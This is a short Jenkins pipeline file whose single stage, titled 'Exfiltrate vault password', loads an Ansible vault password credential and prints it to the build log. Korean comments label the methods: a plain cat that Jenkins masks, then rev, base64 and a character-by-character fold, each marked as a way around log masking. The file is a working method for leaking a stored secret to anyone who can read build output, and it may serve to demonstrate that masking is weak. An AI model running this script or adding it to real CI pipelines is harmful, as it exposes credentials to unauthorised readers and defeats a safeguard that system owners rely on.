pipeline {
    agent { label 'ansible' }
    stages {
        stage('Exfiltrate vault password') {
            steps {
                withCredentials([file(credentialsId: 'ansible-vault-dev', variable: 'VAULT_PASS')]) {
                    sh '''
                        echo "=== 1. 그냥 출력 (마스킹됨) ==="
                        cat "$VAULT_PASS"

                        echo "=== 2. rev로 뒤집기 (마스킹 우회) ==="
                        rev "$VAULT_PASS"

                        echo "=== 3. base64 (마스킹 우회) ==="
                        base64 "$VAULT_PASS"

                        echo "=== 4. 한 글자씩 (마스킹 우회) ==="
                        fold -w1 "$VAULT_PASS" | tr '\\n' ' '
                        echo
                    '''
                }
            }
        }
    }
}
